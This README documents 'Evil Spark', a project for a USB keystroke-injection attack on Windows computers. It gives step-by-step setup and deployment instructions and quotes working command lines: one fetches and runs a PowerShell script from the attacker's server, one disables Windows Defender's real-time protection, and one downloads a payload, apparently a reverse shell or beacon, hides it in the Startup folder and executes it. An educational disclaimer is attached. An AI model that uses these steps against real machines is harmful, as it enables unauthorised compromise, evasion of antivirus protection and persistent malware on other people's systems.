# Evil Spark

**⚠️ Disclaimer: This project is intended for educational and research purposes ONLY. Misuse of this software can lead to serious legal consequences. The author(s) assume no liability and are not responsible for any misuse or damage caused by this project. Always obtain explicit, affirmative consent before conducting any security testing on any system or network.**

## Description
Evil Spark is a project demonstrating a proof-of-concept attack chain using a Digispark-like USB device to automate actions on a target Windows machine. This process aims to download and execute a payload, ultimately establishing persistence. The project integrates a Linux-based setup script for an Apache server to host files, a Digispark sketch for Human Interface Device (HID) emulation, and a PowerShell script for payload deployment and execution.

## Features
* Automated keystroke injection via a Digispark compatible device. [cite: 4]
* Server setup script (`setup.sh`) for easy hosting of necessary files. [cite: 2]
* PowerShell script (`Starter.ps1`) designed to:
    * Attempt to disable Windows Defender's real-time monitoring. [cite: 3]
    * Download the main payload. [cite: 3]
    * Execute the payload. [cite: 3]
    * Establish persistence by placing the payload in the Startup folder. [cite: 3]

## Workflow Overview
The general workflow is as follows:
1.  **Setup:** The attacker uses `setup.sh` on a Linux server to host `Starter.ps1` and the main payload (e.g., `payload.exe`). [cite: 2] The `Evil_Spark.ino` sketch is configured with the server's IP address and uploaded to the Digispark device. [cite: 4]
2.  **Deployment:** The programmed Evil Spark USB device is plugged into the target Windows computer.
3.  **Execution (Automated by Digispark):** The Digispark emulates keyboard input to perform actions such as:
    * Attempting to open and disable Windows Defender. [cite: 4]
    * Opening PowerShell (attempting with administrative privileges). [cite: 4]
    * Commanding PowerShell to download and execute `Starter.ps1` from the attacker's server. [cite: 4]
4.  **Payload Delivery & Persistence (via `Starter.ps1`):**
    * `Starter.ps1` runs on the target machine. [cite: 3]
    * It downloads the main payload (e.g., `payload.exe`, referred to as `ring.exe` within the example `Starter.ps1`) from the server. [cite: 3]
    * The payload is saved to the Windows Startup folder for persistence. [cite: 3]
    * The payload file is hidden. [cite: 3]
    * The payload is executed. [cite: 3]

## Components
1.  **`setup.sh`**:
    * A Bash script for automating the setup of an Apache2 web server on a Debian-based Linux system. [cite: 2]
    * Updates package lists and upgrades existing packages. [cite: 2]
    * Installs `apache2`. [cite: 2]
    * Starts the Apache2 service. [cite: 2]
    * Creates a directory `/var/www/html/tools` to serve files. [cite: 2]
    * Moves specified payload files (defined by `PAYLOAD` and `SHELL_SCRIPT` variables in the script) to the `/var/www/html/tools` directory. [cite: 2]
    * Sets read/write permissions for the owner and read-only for group/others on payload files, and appropriate permissions for the tools directory. [cite: 2]
2.  **`Evil_Spark.ino`** (Digispark Sketch - example based on `Bad_Digi.txt` [cite: 4]):
    * An Arduino sketch designed for Digispark or similar ATtiny85 based USB devices.
    * Simulates keyboard actions (HID attack). [cite: 4]
    * Includes routines to navigate UAC prompts and attempt to disable Windows Defender via keystrokes. [cite: 4]
    * Opens a Run dialog, then PowerShell (attempting administrative privileges), and types a command to download and execute `Starter.ps1` from the attacker's server. [cite: 4]
3.  **`Starter.ps1`**:
    * A PowerShell script intended to be executed on the target Windows machine.
    * Attempts to disable Windows Defender's real-time monitoring using `Set-MpPreference -DisableRealtimeMonitoring $true`. [cite: 3]
    * Defines the path to the user's Startup folder. [cite: 3]
    * Downloads the main executable payload (e.g., `ring.exe` as per the script) from the attacker's server into this Startup folder. [cite: 3]
    * Sets the downloaded file's attributes to Hidden and System (`attrib +h +s`). [cite: 3]
    * Executes the downloaded payload. [cite: 3]
    * Includes a brief sleep and then exits. [cite: 3]
4.  **`payload.exe`** (User-defined payload, example name: `ring.exe` [cite: 3]):
    * This is the final executable that will run on the target machine.
    * **This project does not provide the payload itself.** You must create or provide your own (e.g., a reverse shell, beacon, etc.).
    * Ensure the filename used in `setup.sh` (for the `PAYLOAD` variable) matches the filename `Starter.ps1` attempts to download (e.g., `ring.exe`).

## Prerequisites
* A Linux machine (Debian-based recommended for `setup.sh`) to act as the attacker's server, with `sudo` privileges.
* Digispark ATtiny85 (or compatible) USB development board.
* Arduino IDE or `arduino-cli` for compiling and uploading the `.ino` sketch to the Digispark.
* A Windows target machine for testing **(with explicit, informed consent ONLY)**.
* Your custom `payload.exe` (or `ring.exe`, etc.) file.

## Setup and Usage

### 1. Attacker Server Configuration (`setup.sh`)
1.  Ensure `setup.sh`, your chosen payload executable (e.g., `payload.exe` or `ring.exe`), and `Starter.ps1` are located in the same directory on your Linux server.
2.  Edit `setup.sh`[cite: 2]:
    * Set the `PAYLOAD` variable to the exact filename of your executable (e.g., `PAYLOAD="ring.exe"`).
    * Verify `SHELL_SCRIPT` is set to `Starter.ps1`.
3.  Make `setup.sh` executable: `chmod +x setup.sh`.
4.  Run the script using sudo: `sudo ./setup.sh`.
5.  The script will attempt to display your server's IP address at the end. [cite: 2] Note this IP down.

### 2. `Starter.ps1` Configuration
1.  Open `Starter.ps1` for editing.
2.  Locate the line: `Invoke-WebRequest -Uri "http://192.168.1.109/tools/ring.exe" -OutFile $target`[cite: 3].
3.  Replace `http://192.168.1.109/tools/ring.exe` with the correct URL pointing to your payload on your server (e.g., `http://<YOUR_SERVER_IP>/tools/ring.exe`). Ensure the filename (`ring.exe` or your chosen name) matches what's defined in `setup.sh` and what you intend to use.

### 3. Digispark Programming (`Evil_Spark.ino`)
1.  Open `Evil_Spark.ino` (or your equivalent `.ino` sketch file, based on `Bad_Digi.txt` [cite: 4]) using the Arduino IDE or a text editor.
2.  Find the line responsible for downloading and executing `Starter.ps1`: `DigiKeyboard.print("iex (iwr 'http://<SERVER_IP>/tools/Starter.ps1')");`[cite: 4].
3.  Replace `<SERVER_IP>` with the actual IP address of your Linux server noted in Step 1.5.
4.  If not already done, install the necessary Digispark board drivers and ensure your Arduino IDE is configured for the Digispark board.
5.  Compile and upload the sketch to your Digispark device.

### 4. Deployment
1.  With the attacker's server running and hosting the files, and the Digispark programmed:
2.  Physically plug the Evil Spark USB device into a USB port on the **consenting** target Windows machine.
3.  The Digispark will automatically start typing and executing the pre-programmed commands.

## Important Considerations & Limitations
* **Ethical Use:** Strictly for education. Unauthorized use is illegal.
* **UAC (User Account Control):** The `.ino` sketch includes attempts to navigate UAC prompts using keystrokes like Left Arrow and Enter. [cite: 4] Effectiveness can vary based on target system UAC settings.
* **Antivirus Evasion:** The scripts attempt to disable Windows Defender. [cite: 3, 4] This is a basic attempt and will likely be insufficient against modern, updated antivirus solutions and EDRs. This project is not focused on advanced evasion techniques.
* **Keyboard Layout:** The `DigiKeyboard.h` library typically defaults to a US QWERTY layout. Keystrokes might be incorrect on systems using different keyboard layouts.
* **Timing and Delays:** Delays (`DigiKeyboard.delay()`) in the `.ino` sketch are crucial for reliable execution. [cite: 4] These may need fine-tuning based on the target system's responsiveness.
* **Network Accessibility:** The target machine must have network access to the attacker's server on port 80 (HTTP) to download `Starter.ps1` and the payload. [cite: 2] Firewalls on the server or within the target's network might block this.
* **Error Handling:** The provided scripts have basic error checking but are not exhaustively robust for all possible failure scenarios.
* **Payload Consistency:** Ensure the payload filename is consistent across `setup.sh` (the `PAYLOAD` variable) and `Starter.ps1` (the URI in `Invoke-WebRequest`). [cite: 2, 3]

## License
This project is released for educational purposes. Users are free to modify and use the code responsibly and ethically. No specific license is provided, but it is expected that the software will be used in a manner consistent with the disclaimer. If you adapt or share this project, please maintain the educational context and disclaimers.
